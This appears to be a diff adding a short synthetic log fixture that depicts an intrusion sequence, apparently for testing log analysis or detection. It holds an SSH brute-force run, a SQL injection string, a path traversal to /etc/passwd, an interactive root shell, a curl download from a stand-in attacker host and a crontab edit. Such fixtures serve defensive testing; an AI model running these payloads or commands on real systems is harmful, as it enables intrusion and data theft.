@@ -1,0 +1,12 @@
+[2026-01-01T02:00:01] INFO  sshd: Failed password for root from 203.0.113.5 port 22
+[2026-01-01T02:00:02] INFO  sshd: Failed password for admin from 203.0.113.5 port 22
+[2026-01-01T02:00:03] INFO  sshd: invalid user test from 203.0.113.5
+[2026-01-01T02:00:04] INFO  sshd: Failed password for root from 203.0.113.5 port 22
+[2026-01-01T02:00:05] INFO  sshd: authentication failure for root
+[2026-01-01T02:00:06] INFO  sshd: Failed password for root from 203.0.113.5 port 22
+[2026-01-01T02:00:07] INFO  web: GET /login.php?id=1' OR 1=1-- 200
+[2026-01-01T02:00:08] WARN  web: ../../etc/passwd from 203.0.113.5
+[2026-01-01T02:00:09] INFO  shell: sudo bash -i
+[2026-01-01T02:00:10] INFO  shell: curl -s http://evil.example/data -o /tmp/x
+[2026-01-01T02:00:11] INFO  cron: crontab -e edited
+[2026-01-01T02:00:12] INFO  web: GET /ok 200
